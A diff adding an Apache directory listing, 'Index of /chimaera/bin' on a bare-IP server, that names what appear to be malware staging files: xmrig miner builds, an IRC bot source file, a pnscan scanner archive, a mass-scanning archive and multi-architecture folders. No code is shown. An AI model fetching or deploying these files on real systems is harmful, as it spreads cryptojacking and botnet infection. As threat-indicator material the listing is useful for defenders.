@@ -1,0 +1,28 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /chimaera/bin</title>
+ </head>
+ <body>
+<h1>Index of /chimaera/bin</h1>
+  <table>
+   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=A">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=D">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
+   <tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/chimaera/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="32bit/">32bit/</a></td><td align="right">2021-02-24 07:17  </td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="64bit/">64bit/</a></td><td align="right">2021-02-24 07:20  </td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="aarch64/">aarch64/</a></td><td align="right">2021-02-25 23:15  </td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="rpm_deb_apk/">rpm_deb_apk/</a></td><td align="right">2021-02-24 07:18  </td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="x86_64/">x86_64/</a></td><td align="right">2021-02-26 00:07  </td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="xmr/">xmr/</a></td><td align="right">2021-02-24 07:17  </td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="pnscan_1.12+git20180612.orig.tar.gz">pnscan_1.12+git20180612.orig.tar.gz</a></td><td align="right">2021-02-22 01:57  </td><td align="right"> 16K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="irc_bot.c">irc_bot.c</a></td><td align="right">2021-02-26 00:06  </td><td align="right"> 41K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="1.0.4.tar.gz">1.0.4.tar.gz</a></td><td align="right">2020-11-27 09:13  </td><td align="right">335K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="mass.tar.gz">mass.tar.gz</a></td><td align="right">2021-02-27 23:50  </td><td align="right">452K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/tar.gif" alt="[   ]"></td><td><a href="p.tar">p.tar</a></td><td align="right">2021-02-19 07:00  </td><td align="right">510K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="xmrig-6.8.1-linux-static-x64.tar.gz">xmrig-6.8.1-linux-static-x64.tar.gz</a></td><td align="right">2021-02-03 00:56  </td><td align="right">2.4M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="xmrig">xmrig</a></td><td align="right">2021-02-03 00:09  </td><td align="right">5.8M</td><td>&nbsp;</td></tr>
+   <tr><th colspan="5"><hr></th></tr>
+</table>
+<address>Apache/2.4.18 (Ubuntu) Server at 45.9.148.35 Port 80</address>
+</body></html>
